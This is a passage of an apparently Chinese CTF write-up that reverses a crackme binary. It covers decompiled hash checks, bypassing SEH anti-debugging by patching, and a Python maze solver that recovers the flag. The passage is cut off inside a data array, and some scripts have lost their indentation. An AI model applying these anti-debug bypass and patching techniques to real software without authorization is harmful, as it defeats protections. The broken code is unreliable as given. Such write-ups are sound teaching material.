class="line">        if ( (HIBYTE(v8) ^ (16777619</span><br><span class="line">                          * (BYTE2(v8) ^ (16777619 * (BYTE1(v8) ^ (16777619 * ((unsigned __int8)v8 ^ 0x50C5D1F))))))) == 1563082853 )</span><br><span class="line">          break;</span><br><span class="line">        v28 = 0;</span><br><span class="line">        v9 = i;</span><br><span class="line">        for ( j = 0; ; j = v26 + 1 )</span><br><span class="line">        &#123;</span><br><span class="line">          v26 = j;</span><br><span class="line">          if ( (HIBYTE(j) ^ (16777619</span><br><span class="line">                           * (BYTE2(j) ^ (16777619 * (BYTE1(j) ^ (16777619 * ((unsigned __int8)j ^ 0x50C5D1F))))))) == 1563082853 )</span><br><span class="line">            break;</span><br><span class="line">          v9 = i;</span><br><span class="line">          v28 += v29[v26] * byte_404AC0[i + v26];</span><br><span class="line">        &#125;</span><br><span class="line">        v11 = v25;</span><br><span class="line">        *((_BYTE *)&amp;v31[-1130] + v25) = v28;</span><br><span class="line">        v8 = v11 + 1;</span><br><span class="line">      &#125;</span><br><span class="line">      for ( k = 0;</span><br><span class="line">            (HIBYTE(k) ^ (16777619 * (BYTE2(k) ^ (16777619 * (BYTE1(k) ^ (16777619 * ((unsigned __int8)k ^ 0x50C5D1F))))))) != 1563082853;</span><br><span class="line">            ++k )</span><br><span class="line">      &#123;</span><br><span class="line">        if ( *((_BYTE *)&amp;v31[-1130] + k) != byte_404AAC[k] )</span><br><span class="line">        &#123;</span><br><span class="line">          v13 = sub_401A40();</span><br><span class="line">          std::ostream::operator&lt;&lt;(v13);</span><br><span class="line">          exit(-1);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      v14 = sub_401A40();</span><br><span class="line">      std::ostream::operator&lt;&lt;(v14);</span><br><span class="line">      JUMPOUT(0x401A17);</span><br><span class="line">    &#125;</span><br><span class="line">    v15 = sub_401A40();</span><br><span class="line">    std::ostream::operator&lt;&lt;(v15);</span><br><span class="line">    exit(-1);</span><br><span class="line">  &#125;</span><br><span class="line">  strcpy(v30, &quot;The quick brown fox jumps over the lazy dog.&quot;);</span><br><span class="line">  sub_401000(v30, v6);</span><br><span class="line">  memset(v30, 0, 40);</span><br><span class="line">  v17 = sub_4014E0(v30, v29, v16);</span><br><span class="line">  for ( m = 0; m &lt; 40; ++m )</span><br><span class="line">  &#123;</span><br><span class="line">    LOBYTE(v17) = v30[m];</span><br><span class="line">    if ( (_BYTE)v17 != byte_404BC0[m] )</span><br><span class="line">    &#123;</span><br><span class="line">      v22 = (*(int (**)(void))(v17 + 1284029000))();</span><br><span class="line">      byte_402FFF[v22 - 4206718] += BYTE1(v23);</span><br><span class="line">      *(_BYTE *)(v23 - 23) += v24;</span><br><span class="line">      JUMPOUT(0x401A3D);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  v19 = sub_401A40();</span><br><span class="line">  v20 = std::ostream::operator&lt;&lt;(v19);</span><br><span class="line">  (*(void (**)(void))(v20 - 62026936))();</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第一个需要逆向的地方是<code>v6 = BYTE2(v5) ^ (16777619 * (BYTE1(v5) ^ (16777619 * ((unsigned __int8)v5 ^ 0x50C5D1F)))); v7 = HIBYTE(v5) ^ (16777619 * v6);if ( v7 != 1166501587 )</code></p><p>其中v5是输入字符串的长度，类型为int，四个字节。BYTE1是v5第二个字节，BYTE2是v5第三个字节，HIBYTE是最高字节，注意C语言变量是小端序。这段代码就是最小的字节和0x50C5D1F异或以后，乘以16777619，再和下一个字节异或，直到最高字节。于是python脚本：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">for i in range(256):</span><br><span class="line">v7 = i</span><br><span class="line">v8 = ((v7 &gt;&gt; 16) &amp; 0xff) ^ ((0x1000193 * (((v7 &gt;&gt; 8) &amp; 0xff) ^ ((0x1000193 * (((v7 &amp; 0xFF) ^ 0x50C5D1F) &amp; 0xFFFFFFFF)) &amp; 0xFFFFFFFF))) &amp; 0xFFFFFFFF)</span><br><span class="line">v9 = ((v7 &gt;&gt; 32) &amp; 0xff) ^ ((0x1000193 * v8) &amp; 0xFFFFFFFF)</span><br><span class="line">if (v9 == 0x458766D3 or v9 == 0x5D2AC065):</span><br><span class="line">print(v9,i)</span><br><span class="line">0x5d2ac065 16</span><br><span class="line">0x458766d3 134</span><br></pre></td></tr></table></figure><p>这里有两个分支，长度为134的分支是正确的。长度是16的分支进入下面的代码</p><figure><img src="1661448528575.png" alt="1661448528575"><figcaption>1661448528575</figcaption></figure><figure><img src="1661448555663.png" alt="1661448555663"><figcaption>1661448555663</figcaption></figure><p>无论结果是啥都进入了0x401A40的地址，猜测一下，结合下文，很容易知道这段不是需要走的分支。（比赛时候我动调进去了，查了小一会儿发现不对，还是too young！这题应该有反调试，可能是SEH的，我的x96dbg有过反调插件sharpOD。ida直接动调不行的。）</p><p>之后，有个关键函数0x4014E0很可疑，调用了输入变量v29。</p><figure><img src="1661448781490.png" alt="1661448781490"><figcaption>1661448781490</figcaption></figure><p>经过一通patch后f5看到函数4014E0。发现关键语句<code>ms_exc.registration.TryLevel = 0</code></p><p>这是try except的特征。tab进入汇编视图发现有try，并且在0x401546产生了异常，进入except。当时看到了 https://bbs.pediy.com/thread-252152.htm 这篇大佬师傅写的文章，也研究了一下，动调在这里也断掉了一直挂。怎么也搞不通，直到比赛结束，我还是个老菜鸡。</p><figure><img src="1661448903235.png" alt="1661448903235"><figcaption>1661448903235</figcaption></figure><p>这个异常最后进入了0x4011E0这个函数，这是比赛中调到的地方。</p><figure><img src="1661449148944.png" alt="1661449148944"><figcaption>1661449148944</figcaption></figure><p>比赛结束之后，晚上问大爷，大爷解释：1、这个异常是<code>void x() &#123;char a[0];a[1145141919810];&#125;</code></p><p>2、SEH 反调试的原理是，遇到异常的时候会首先交给调试器，单步过不去。调试器需要改参数。</p><figure><img src="1661449598278.png" alt="1661449598278"><figcaption>1661449598278</figcaption></figure><p>忽略范围-开始-C0000005-确定。添加了这个就不会在0x401546卡住了。接着在exception handler下个断点可以进入0x4011E0这个最后的函数了。最后的函数中，也是一个try exception跳到exception欺骗ida，ida确实不分析exception handler 里的代码。之后经过大爷提示，在异常代码地址patch，用jmp直接跳到exception handler就行。把0x401232地址patch成jmp到0x401278，并且把0x401278上的try except的code也patch掉了。</p><figure><img src="1661450025162.png" alt="1661450025162"><figcaption>1661450025162</figcaption></figure><figure><img src="1661450043745.png" alt="1661450043745"><figcaption>1661450043745</figcaption></figure><p>f5后得到了最后的函数，核心部分：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">  v1 = <span class="number">0</span>;</span><br><span class="line">  v10 = <span class="number">0</span>;</span><br><span class="line">  v2 = input;</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strlen</span>(input) )</span><br><span class="line">  &#123;</span><br><span class="line">    LOWORD(v4) = <span class="number">0</span>;</span><br><span class="line">    LOWORD(v5) = <span class="number">0</span>;</span><br><span class="line">LABEL_21:</span><br><span class="line">    <span class="keyword">if</span> ( (HIBYTE(v18) ^ (<span class="number">16777619</span></span><br><span class="line">                       * (BYTE2(v18) ^ (<span class="number">16777619</span> * (BYTE1(v5) ^ (<span class="number">16777619</span> * ((<span class="type">unsigned</span> __int8)v5 ^ <span class="number">0x50C5D1F</span>))))))) != <span class="number">1636823865</span></span><br><span class="line">      &amp;&amp; (HIBYTE(v17) ^ (<span class="number">16777619</span></span><br><span class="line">                       * (BYTE2(v17) ^ (<span class="number">16777619</span> * (BYTE1(v4) ^ (<span class="number">16777619</span> * ((<span class="type">unsigned</span> __int8)v4 ^ <span class="number">0x50C5D1F</span>))))))) != <span class="number">1636823865</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(v9);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">41</span>; ++i )</span><br><span class="line">      <span class="built_in">putchar</span>((<span class="type">unsigned</span> __int8)(*((_BYTE *)v12 + i) + *((_BYTE *)v14 + i)));</span><br><span class="line">    <span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  v16 = <span class="number">0</span>;</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v6 = v2[v1];</span><br><span class="line">    <span class="keyword">switch</span> ( v6 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;h&#x27;</span>:</span><br><span class="line">        v18 = --v5;</span><br><span class="line">        v3 -= <span class="number">21</span>;</span><br><span class="line">        v16 = v3;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_12;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;j&#x27;</span>:</span><br><span class="line">        v18 = v5 + <span class="number">1</span>;</span><br><span class="line">        v16 = v3 + <span class="number">21</span>;</span><br><span class="line">        v4 = v17;</span><br><span class="line">        ++v5;</span><br><span class="line">        v3 += <span class="number">21</span>;</span><br><span class="line">        v1 = v10;</span><br><span class="line">        v2 = input;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_12;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;k&#x27;</span>:</span><br><span class="line">        --v4;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;l&#x27;</span>:</span><br><span class="line">        ++v4;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">goto</span> LABEL_12;</span><br><span class="line">    &#125;</span><br><span class="line">    v17 = v4;</span><br><span class="line">LABEL_12: <span class="comment">//判断条件</span></span><br><span class="line">    <span class="keyword">if</span> ( v5 &lt; <span class="number">0</span></span><br><span class="line">      || v4 &lt; <span class="number">0</span></span><br><span class="line">      || v5 &gt;= <span class="number">21</span></span><br><span class="line">      || v4 &gt;= <span class="number">21</span></span><br><span class="line">      || (v5 ^ (v4 &lt;&lt; <span class="number">8</span>) ^ dword_4043C8[v3 + v4] ^ (<span class="type">unsigned</span> __int8)byte_404208[v3 + v4]) != <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    v10 = ++v1;</span><br><span class="line">    v7 = <span class="built_in">strlen</span>(v2);</span><br><span class="line">    v3 = v16;</span><br><span class="line">    v2 = input;</span><br><span class="line">    <span class="keyword">if</span> ( v1 &gt;= v7 )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_21;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这显然是一个迷宫。Label12是判断条件，Label21的if满足以后，就可以真正得到flag。</p><p>先满足Label21的if:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> v7 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">22</span>):</span><br><span class="line">v8 = ((v7 &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xff</span>) ^ ((<span class="number">0x1000193</span> * (((v7 &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xff</span>) ^ ((<span class="number">0x1000193</span> * (((v7 &amp; <span class="number">0xFF</span>) ^ <span class="number">0x50C5D1F</span>) &amp; <span class="number">0xFFFFFFFF</span>)) &amp; <span class="number">0xFFFFFFFF</span>))) &amp; <span class="number">0xFFFFFFFF</span>)</span><br><span class="line">v9 = ((v7 &gt;&gt; <span class="number">32</span>) &amp; <span class="number">0xff</span>) ^ ((<span class="number">0x1000193</span> * v8) &amp; <span class="number">0xFFFFFFFF</span>)</span><br><span class="line"><span class="keyword">if</span> v9 == <span class="number">0x618ff339</span>:</span><br><span class="line"><span class="built_in">print</span>(v7)</span><br><span class="line"><span class="comment">#20</span></span><br></pre></td></tr></table></figure><p>迷宫出口是20，20。判断的条件Label12是位置和两个数组的异或，网上找了一段大佬的走迷宫算法改一下，便可以求出来flag。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">dirs=[(<span class="number">0</span>,<span class="number">1</span>),(<span class="number">1</span>,<span class="number">0</span>),(<span class="number">0</span>,-<span class="number">1</span>),(-<span class="number">1</span>,<span class="number">0</span>)] <span class="comment">#当前位置四个方向的偏移量</span></span><br><span class="line">path=[]              <span class="comment">#存找到的路径</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mark</span>(<span class="params">maze,pos</span>):  <span class="comment">#给迷宫maze的位置pos标&quot;-1&quot;表示“到过了”</span></span><br><span class="line">    maze[pos[<span class="number">0</span>]][pos[<span class="number">1</span>]]=-<span class="number">1</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">passable</span>(<span class="params">maze,pos</span>): <span class="comment">#检查迷宫maze的位置pos是否可通行</span></span><br><span class="line">    <span class="keyword">if</span> (pos[<span class="number">0</span>] &gt;= <span class="number">21</span> <span class="keyword">or</span> pos[<span class="number">0</span>] &lt; <span class="number">0</span> <span class="keyword">or</span> pos[<span class="number">1</span>] &gt;= <span class="number">21</span> <span class="keyword">or</span> pos[<span class="number">1</span>] &lt; <span class="number">0</span>):</span><br><span class="line">        <span class="keyword">return</span> false</span><br><span class="line">    <span class="keyword">return</span> maze[pos[<span class="number">0</span>]][pos[<span class="number">1</span>]] ^ pos[<span class="number">0</span>] ^ (pos[<span class="number">1</span>] &lt;&lt; <span class="number">8</span>) == <span class="number">1</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_path</span>(<span class="params">maze,pos,end</span>):</span><br><span class="line">    mark(maze,pos)</span><br><span class="line">    <span class="keyword">if</span> pos==end:</span><br><span class="line">        <span class="built_in">print</span>(pos,end=<span class="string">&quot; &quot;</span>)  <span class="comment">#已到达出口，输出这个位置。成功结束</span></span><br><span class="line">        path.append(pos)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):      <span class="comment">#否则按四个方向顺序检查</span></span><br><span class="line">        nextp=pos[<span class="number">0</span>]+dirs[i][<span class="number">0</span>],pos[<span class="number">1</span>]+dirs[i][<span class="number">1</span>]</span><br><span class="line">        <span class="comment">#考虑下一个可能方向</span></span><br><span class="line">        <span class="keyword">if</span> passable(maze,nextp):        <span class="comment">#不可行的相邻位置不管</span></span><br><span class="line">            <span class="keyword">if</span> find_path(maze,nextp,end):<span class="comment">#如果从nextp可达出口，输出这个位置，成功结束</span></span><br><span class="line">                <span class="built_in">print</span>(pos,end=<span class="string">&quot; &quot;</span>)</span><br><span class="line">                path.append(pos)</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">see_path</span>(<span class="params">maze,path</span>):     <span class="comment">#使寻找到的路径可视化</span></span><br><span class="line">    <span class="keyword">for</span> i,p <span class="keyword">in</span> <span class="built_in">enumerate</span>(path):</span><br><span class="line">        <span class="keyword">if</span> i==<span class="number">0</span>:</span><br><span class="line">            maze[p[<span class="number">0</span>]][p[<span class="number">1</span>]] =<span class="string">&quot;E&quot;</span></span><br><span class="line">        <span class="keyword">elif</span> i==<span class="built_in">len</span>(path)-<span class="number">1</span>:</span><br><span class="line">            maze[p[<span class="number">0</span>]][p[<span class="number">1</span>]]=<span class="string">&quot;S&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            maze[p[<span class="number">0</span>]][p[<span class="number">1</span>]] =-<span class="number">2</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    flag = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(path) - <span class="number">1</span>):</span><br><span class="line">        dx = path[i + <span class="number">1</span>][<span class="number">0</span>] - path[i][<span class="number">0</span>]   //后状态减去前状态。</span><br><span class="line">        dy = path[i + <span class="number">1</span>][<span class="number">1</span>] - path[i][<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">if</span> dx == <span class="number">1</span>:</span><br><span class="line">            flag += <span class="string">&quot;h&quot;</span></span><br><span class="line">        <span class="keyword">if</span> dx == -<span class="number">1</span>:</span><br><span class="line">            flag += <span class="string">&quot;j&quot;</span></span><br><span class="line">        <span class="keyword">if</span> dy == -<span class="number">1</span>:</span><br><span class="line">            flag += <span class="string">&quot;l&quot;</span></span><br><span class="line">        <span class="keyword">if</span> dy == <span class="number">1</span>:</span><br><span class="line">            flag += <span class="string">&quot;k&quot;</span> </span><br><span class="line">    <span class="built_in">print</span>(flag[::-<span class="number">1</span>])</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"></span><br><span class="line">    byte_404208 = [<span class="number">0x45</span>, <span class="number">0x24</span>, <span class="number">0xBD</span>, <span class="number">0x3E</span>, <span class="number">0x32</span>, <span class="number">0x9D</span>, <span class="number">0x8F</span>, <span class="number">0x53</span>, <span class="number">0xCC</span>, <span class="number">0x4F</span>, <span class="number">0x8D</span>, <span class="number">0x2C</span>, <span class="number">0x7C</span>, <span class="number">0xF2</span>, <span class="number">0xBA</span>, <span class="number">0x30</span>, <span class="number">0x0D</span>, <span class="number">0xC7</span>, <span class="number">0x57</span>, <span class="number">0x19</span>, <span class="number">0x91</span>, <span class="number">0xF4</span>, <span class="number">0xE6</span>, <span class="number">0x28</span>, <span class="number">0x4F</span>, <span class="number">0xEE</span>, <span class="number">0x47</span>, <span class="number">0x7C</span>, <span class="number">0xD8</span>, <span class="number">0xF8</span>, <span class="number">0xD8</span>, <span class="number">0x79</span>, <span class="number">0xD1</span>, <span class="number">0x7A</span>, <span class="number">0x32</span>, <span class="number">0x82</span>, <span class="number">0xD9</span>, <span class="number">0xDF</span>, <span class="number">0x20</span>, <span class="number">0xD6</span>, <span class="number">0xEF</span>, <span class="number">0x5E</span>, <span class="number">0x24</span>, <span class="number">0x6E</span>, <span class="number">0x67</span>, <span class="number">0xB4</span>, <span class="number">0x9D</span>, <span class="number">0x49</span>, <span class="number">0xCA</span>, <span class="number">0xDD</span>, <span class="number">0x64</span>, <span class="number">0x9D</span>, <span class="number">0x0E</span>, <span class="number">0x2F</span>, <span class="number">0x0E</span>, <span class="number">0xBD</span>, <span class="number">0x1B</span>, <span class="number">0x81</span>, <span class="number">0xF3</span>, <span class="number">0x6B</span>, <span class="number">0x5F</span>, <span class="number">0xA1</span>, <span class="number">0xAC</span>, <span class="number">0x0E</span>, <span class="number">0x66</span>, <span class="number">0x76</span>, <span class="number">0x3F</span>, <span class="number">0xBF</span>, <span class="number">0x80</span>, <span class="number">0x94</span>, <span class="number">0x86</span>, <span class="number">0x44</span>, <span class="number">0xA9</span>, <span class="number">0xB8</span>, <span class="number">0xB8</span>, <span class="number">0xFE</span>, <span class="number">0xB5</span>, <span class="number">0x1A</span>, <span class="number">0x94</span>, <span class="number">0x6F</span>, <span class="number">0x3B</span>, <span class="number">0x64</span>, <span class="number">0xF6</span>, <span class="number">0x82</span>, <span class="number">0x76</span>, <span class="number">0x0A</span>, <span class="number">0x28</span>, <span class="number">0xAB</span>, <span class="number">0x8D</span>, <span class="number">0xB7</span>, <span class="number">0xB7</span>, <span class="number">0xC1</span>, <span class="number">0x0F</span>, <span class="number">0x1A</span>, <span class="number">0x3A</span>, <span class="number">0xFC</span>, <span class="number">0x77</span>, <span class="number">0x71</span>, <span class="number">0xE6</span>, <span class="number">0x5F</span>, <span class="number">0x3C</span>, <span class="number">0x9F</span>, <span class="number">0xEC</span>, <span class="number">0x3A</span>, <span class="number">0x83</span>, <span class="number">0xAF</span>, <span class="number">0x32</span>, <span class="number">0x9D</span>, <span class="number">0x43</span>, <span class="number">0xD6</span>, <span class="number">0xD0</span>, <span class="number">0x9B</span>, <span class="number">0x14</span>, <span class="number">0xBD</span>, <span class="number">0x78</span>, <span class="number">0xDC</span>, <span class="number">0xD6</span>, <span class="number">0xC2</span>, <span class="number">0x1D</span>, <span class="number">0x54</span>, <span class="number">0xB3</span>, <span class="number">0xCE</span>, <span class="number">0xF8</span>, <span class="number">0x71</span>, <span class="number">0x92</span>, <span class="number">0x44</span>, <span class="number">0x85</span>, <span class="number">0xA2</span>, <span class="number">0x58</span>, <span class="number">0xEF</span>, <span class="number">0x80</span>, <span class="number">0x2F</span>, <span class="number">0xF0</span>, <span class="number">0x90</span>, <span class="number">0xF4</span>, <span class="number">0xAB</span>, <span class="number">0xDB</span>, <span class="number">0x63</span>, <span class="number">0x74</span>, <span class="number">0xE1</span>, <span class="number">0xBB</span>, <span class="number">0xCA</span>, <span class="number">0xC5</span>, <span class="number">0xAC</span>, <span class="number">0x39</span>, <span class="number">0xA7</span>, <span class="number">0x56</span>, <span class="number">0x45</span>, <span class="number">0x25</span>, <span class="number">0xAA</span>, <span class="number">0xCA</span>, <span class="number">0x2A</span>, <span class="number">0x30</span>, <span class="number">0x95</span>, <span class="number">0xDC</span>, <span class="number">0x17</span>, <span class="number">0x31</span>, <span class="number">0x4F</span>, <span class="number">0x62</span>, <span class="number">0x39</span>, <span class="number">0xA4</span>, <span class="number">0x1C</span>, <span class="number">0x93</span>, <span class="number">0xE1</span>, <span class="number">0xA9</span>, <span class="number">0x2F</span>, <span class="number">0xB3</span>, <span class="number">0x4F</span>, <span class="number">0x26</span>, <span class="number">0x53</span>, <span class="number">0x47</span>, <span class="number">0x23</span>, <span class="number">0xDB</span>, <span class="number">0x34</span>, <span class="number">0xDE</span>, <span class="number">0xC1</span>, <span class="number">0x27</span>, <span class="number">0x5F</span>, <span class="number">0xEB</span>, <span class="number">0x2E</span>, <span class="number">0x91</span>, <span class="number">0x5E</span>, <span class="number">0xCA</span>, <span class="number">0xCB</span>, <span class="number">0xD6</span>, <span class="number">0x11</span>, <span class="number">0xA3</span>, <span class="number">0x8F</span>, <span class="number">0x47</span>, <span class="number">0xDD</span>, <span class="number">0xC0</span>, <span class="number">0xFB</span>, <span class="number">0xEE</span>, <span class="number">0xCF</span>, <span class="number">0xC9</span>, <span class="number">0xCA</span>, <span class="number">0xD9</span>, <span class="number">0xF8</span>, <span class="number">0xB9</span>, <span class="number">0x15</span>, <span class="number">0x34</span>, <span class="number">0x23</span>, <span class="number">0x6B</span>, <span class="number">0x6D</span>, <span class="number">0x28</span>, <span class="number">0xF6</span>, <span class="number">0xE2</span>, <span class="number">0x1E</span>, <span class="number">0xF8</span>, <span class="number">0xFF</span>, <span class="number">0xEB</span>, <span class="number">0xFB</span>, <span class="number">0xE9</span>, <span class="number">0x70</span>, <span class="number">0x5C</span>, <span class="number">0xD4</span>, <span class="number">0xED</span>, <span class="number">0x78</span>, <span class="number">0xD4</span>, <span class="number">0x7A</span>, <span class="number">0x22</span>, <span class="number">0x1C</span>, <span class="number">0x69</span>, <span class="number">0xF1</span>, <span class="number">0x39</span>, <span class="number">0x61</span>, <span class="number">0xC2</span>, <span class="number">0xB9</span>, <span class="number">0x7B</span>, <span class="number">0xF3</span>, <span class="number">0xC2</span>, <span class="number">0xA2</span>, <span class="number">0x99</span>, <span class="number">0x64</span>, <span class="number">0x48</span>, <span class="number">0xAC</span>, <span class="number">0x38</span>, <span class="number">0x55</span>, <span class="number">0x0C</span>, <span class="number">0xB3</span>, <span class="number">0x0B</span>, <span class="number">0xD6</span>, <span class="number">0x9B</span>, <span class="number">0x46</span>, <span class="number">0x70</span>, <span class="number">0x8B</span>, <span class="number">0xCD</span>, <span class="number">0x0F</span>, <span class="number">0x87</span>, <span class="number">0xCB</span>, <span class="number">0x7F</span>, <span class="number">0xE0</span>, <span class="number">0xAB</span>, <span class="number">0x4A</span>, <span class="number">0xCB</span>, <span class="number">0x79</span>, <span class="number">0x43</span>, <span class="number">0xE2</span>, <span class="number">0x60</span>, <span class="number">0x15</span>, <span class="number">0x0A</span>, <span class="number">0x7C</span>, <span class="number">0x0A</span>, <span class="number">0xD9</span>, <span class="number">0x15</span>, <span class="number">0x41</span>, <span class="number">0xF3</span>, <span class="number">0x2C</span>, <span class="number">0x2C</span>, <span class="number">0x61</span>, <span class="number">0x14</span>, <span class="number">0xC1</span>, <span class="number">0x43</span>, <span class="number">0xA5</span>, <span class="number">0x1A</span>, <span class="number">0xC7</span>, <span class="number">0x33</span>, <span class="number">0xC9</span>, <span class="number">0x89</span>, <span class="number">0xB7</span>, <span class="number">0x37</span>, <span class="number">0xC4</span>, <span class="number">0x57</span>, <span class="number">0x81</span>, <span class="number">0x23</span>, <span class="number">0xCA</span>, <span class="number">0xD4</span>, <span class="number">0xF1</span>, <span class="number">0x7E</span>, <span class="number">0xF4</span>, <span class="number">0x65</span>, <span class="number">0x8D</span>, <span class="number">0x72</span>, <span class="number">0x6B</span>, <span class="number">0xA4</span>, <span class="number">0x9A</span>, <span class="number">0xEE</span>, <span class="number">0xAC</span>, <span class="number">0xBA</span>, <span class="number">0x71</span>, <span class="number">0x4E</span>, <span class="number">0xDE</span>, <span class="number">0x6A</span>, <span class="number">0x88</span>, <span class="number">0x36</span>, <span class="number">0x1D</span>, <span class="number">0x72</span>, <span class="number">0xB1</span>, <span class="number">0xF0</span>, <span class="number">0x9B</span>, <span class="number">0x69</span>, <span class="number">0x19</span>, <span class="number">0xB0</span>, <span class="number">0x7C</span>, <span class="number">0xEA</span>, <span class="number">0xF7</span>, <span class="number">0x51</span>, <span class="number">0x62</span>, <span class="number">0xD1</span>, <span class="number">0x3A</span>, <span class="number">0x67</span>, <span class="number">0x56</span>, <span class="number">0x66</span>, <span class="number">0xBA</span>, <span 